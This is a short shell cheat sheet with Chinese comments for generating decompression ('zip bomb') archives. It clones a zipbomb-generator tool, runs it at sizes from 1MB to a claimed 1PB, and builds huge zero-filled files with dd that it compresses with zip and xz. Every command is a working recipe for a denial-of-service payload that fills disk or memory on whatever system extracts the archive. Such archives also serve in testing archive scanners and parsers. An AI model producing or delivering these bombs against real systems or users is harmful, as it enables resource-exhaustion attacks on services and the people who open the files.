# 自动
git clone https://github.com/CreeperKong/zipbomb-generator.git
cd zipbomb-generator
# 100个文件，每个文件大小1024KB，解压缩后约100MB
python3 zipbomb.py --mode=quoted_overlap --num-files=100 --compressed-size=1024 > /mnt/b/zbsm.zip
# 1个文件，单文件3GB（单文件3GB上限）
python3 zipbomb.py --mode=quoted_overlap --num-files=1 --compressed-size=$((1024*1024*3)) > /mnt/b/3GB.zip
# 1MB
python3 zipbomb.py --mode=quoted_overlap --num-files=1 --compressed-size=1024 > /mnt/b/1MB.zip
# 1GB
python3 zipbomb.py --mode=quoted_overlap --num-files=1 --compressed-size=$((1024*1024)) > /mnt/b/1GB.zip
# 1TB
python3 zipbomb.py --mode=quoted_overlap --num-files=512 --compressed-size=$((1024*1024*2)) > /mnt/b/1TB.zip
# 1PB
python3 zipbomb.py --mode=quoted_overlap --num-files=$((512*1024*1024)) --compressed-size=$((1024*1024*2)) > /mnt/b/1PB.zip
# EB失败

# 手动
dd if=/dev/zero count=$((1024*1024)) bs=4096 of=/mnt/b/bombfile.txt
# if=源文件名，如果没有文件内容要求，可以指定为系统自带的0源文件，制作好的文件内容也会是0。
# count=blocks，拷贝blocks个数据块，块大小取决于bs或ibs指定的字节数。
# bs=bytes，同时设置输入/输出的数据块大小是bytes个字节。
# of=输出文件名，自己任取。

# 1KB
dd if=/dev/zero count=1 bs=1024 of=/mnt/b/bombfile.txt
# 1MB
dd if=/dev/zero count=1024 bs=1024 of=/mnt/b/bombfile.txt
dd if=/dev/zero count=1 bs=$((1024*1024)) of=/mnt/b/bombfile.txt
# 1GB (bs 会用1GB内存)
dd if=/dev/zero count=1 bs=$((1024*1024*1024)) of=/mnt/d/bombfile.txt

# 压 zip
zip -9 bombfile.zip bombfile.txt
# -9：设置压缩级别，9最大，1最小。
# bombfile.zip：输出压缩文件名
# bombfile.txt：压缩源文件
# https://www.it610.com/article/1289832268336013312.htm

# XZ 压缩包含1GB数据压缩包 无需临时文件
dd if=/dev/zero count=1024 bs=$((1024*1024)) | xz -z -9 -e -T 0 >/mnt/b/bombfile.xz
# 1TB 低优先级生成
nice -n 19 dd if=/dev/zero count=$((1024*1024)) bs=$((1024*1024)) | nice -n 18 xz -z -9 -e -T 0 >/mnt/b/1TB.xz